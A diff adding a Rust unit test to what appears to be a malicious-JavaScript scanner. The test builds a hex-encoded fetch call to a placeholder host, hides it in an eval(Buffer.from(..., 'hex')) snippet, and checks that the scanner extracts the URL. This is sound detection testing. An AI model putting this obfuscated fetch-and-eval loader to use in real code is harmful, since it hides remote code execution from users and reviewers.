@@ -10412,6 +10412,31 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_buffer_from_hex_payload_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let payload = "fetch('https://buffer-from-hex-js.example/p')";
+        let encoded = payload
+            .as_bytes()
+            .iter()
+            .map(|byte| format!("{byte:02x}"))
+            .collect::<String>();
+        let js =
+            format!(r#"var b = "{encoded}"; eval(Buffer.from(b, "hex").toString())"#).into_bytes();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "https://buffer-from-hex-js.example/p"
+            )
+        });
+        assert!(
+            has,
+            "JS Buffer.from hex payload URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_atob_regex_whitespace_replace_payload_url_extracted() {
         let mut env = Environment::new(&Config::default());
         let encoded = base64::Engine::encode(
